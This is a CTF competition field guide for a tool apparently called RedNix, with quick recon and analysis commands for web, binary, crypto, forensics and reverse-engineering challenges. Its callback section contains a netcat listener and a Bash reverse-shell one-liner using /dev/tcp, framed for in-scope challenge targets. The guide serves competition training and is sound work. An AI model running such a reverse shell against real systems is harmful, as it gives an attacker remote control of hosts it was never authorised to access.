# CTF field guide

Short checks for when the clock is running. Commands use `TARGET`, `PORT`, or `FILE` as placeholders. Check the event rules and scope before sending traffic. Save useful output under `/work`.

## Start here

1. Read the challenge text. Write down target, port, files, flag format, and scope.
2. Get one working connection or one clean copy of each file.
3. Run the matching quick checks below. Save output. Tell the team what you learned.
4. Split work: one person maps behavior, one reads the artifact, one checks likely fixes or alternate paths.
5. Submit a flag as soon as it is confirmed. Keep notes for the writeup.

## First five minutes

### Web

```sh
curl -i http://TARGET:PORT/
whatweb http://TARGET:PORT/
ffuf -u http://TARGET:PORT/FUZZ -w "$WORDLIST"
```

Read page source, `robots.txt`, response headers, cookies, and JavaScript. Try the feature the challenge describes before fuzzing. Keep requests inside the given scope.

### Pwn or service

```sh
nc -nv TARGET PORT
nmap -Pn -sV -p PORT TARGET
file ./challenge
pwn checksec ./challenge
```

For a binary, find input and output first. Run it locally. Then inspect protections and crash behavior. Use `gdb`, `pwntools`, and the supplied libc when present.

### Packet capture

```sh
capinfos capture.pcap
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -Y 'http.request or dns'
```

In Wireshark, check protocol hierarchy and conversations. Follow streams that look useful. Export objects only after noting the packet and stream numbers.

### Crypto

```sh
file challenge.txt
xxd -l 128 challenge.txt
openssl enc -d -<cipher> -in input -out output
```

Check encoding, length, repeated blocks, known plaintext, nonce reuse, and whether the challenge gives a hint or key fragment. Do not guess ciphers at random. Use Sage or Python for small math experiments.

### Forensics and stego

```sh
file artifact
sha256sum artifact
exiftool artifact
strings -a -n 6 artifact | head -80
binwalk artifact
```

Fast read-only summary: `python3 /etc/rednix/field-guide/scripts/triage.py artifact`.

Work on a copy. For images, try `zbarimg image.png`, `steghide info image.jpg`, and `pngcheck -v image.png`. Check archives and appended data. A tool finding is a lead, not proof.

### Reverse engineering

```sh
file program
strings -a program | less
readelf -h -s program
```

Run it with ordinary and boundary inputs. Find the success check, compare values, and trace backward. Use Ghidra for structure, then confirm guesses with a debugger.

## Callback quick reference

First learn the address the challenge can reach. In guest NAT mode, the guest can make outbound connections, but the challenge network cannot initiate a connection back into the guest. Use a challenge-provided listener or stay with outbound interaction.

In routed mode, the guest address is `10.7.0.2`. Get event approval before enabling it. Never bridge the event network. Set up the host before starting the guest:

```sh
sudo rednix net up EVENT --iface CTF_INTERFACE
rednix start EVENT --network routed
```

On the guest, start a plain listener:

```sh
nc -lvnp PORT
```

Test the path from a second machine on the permitted event network. Connect to the host's CTF-facing address and the callback port. Do not test by connecting from the guest to itself:

```sh
python3 -c 'import socket,sys; s=socket.create_connection((sys.argv[1],int(sys.argv[2]))); s.sendall(b"rednix callback test\\n"); s.close()' HOST_CTF_IP PORT
```

From the host, allow that port for the event after `net up`:

```sh
sudo rednix net callback EVENT PORT
```

RedNix does not forward arbitrary inbound ports in NAT mode. In routed mode, only configured callback ports pass. If no test text arrives, check guest route, host TAP, callback rule, target address, and event scope.

For a challenge target that gives you a shell, a common Bash callback shape is:

```sh
bash -c 'bash -i >& /dev/tcp/HOST_CTF_IP/PORT 0>&1'
```

Use this only against an in-scope challenge target. Replace the address and port. First prove that the callback path works with the harmless test above. Some targets lack Bash or block outbound connections, so match the payload to the target environment.

## Attack/defense quick loop

1. Inventory service ports and health checks. Record the baseline.
2. Find the flag path and how often flags rotate. Protect availability first.
3. Reproduce one bug locally. Write a small check that proves it.
4. Patch the root cause. Keep service behavior and data format intact.
5. Test from a clean state. Check logs and service health.
6. Share the patch and exploit details with teammates. Follow event rules for attacking other teams.

## Handy places

- Challenge files: `/work`
- Event state and logs: `$STATE_ROOT/events/<event>` on the host
- Guest outbound check: `curl -I https://example.com` when internet is meant to be available
- Guest route and DNS: `ip route`, `cat /etc/resolv.conf`
- In the guest browser: open `file:///etc/rednix/field-guide/index.html`
- Search this guide: open `index.html` in a browser or run `python3 -m http.server 8765 --directory docs/field-guide` from the repo root, then visit `http://127.0.0.1:8765`.

The web search is offline and instant. It matches terms and a small set of common phrasings. It does not create embeddings or understand every paraphrase. A fully local semantic assistant such as [Khoj](https://docs.khoj.dev/get-started/setup/) can answer in natural language, but needs a preinstalled model and a separate service. That is a later add-on, not a weekend dependency.

Keep the guide small. Add notes only after a teammate can follow them under time pressure.
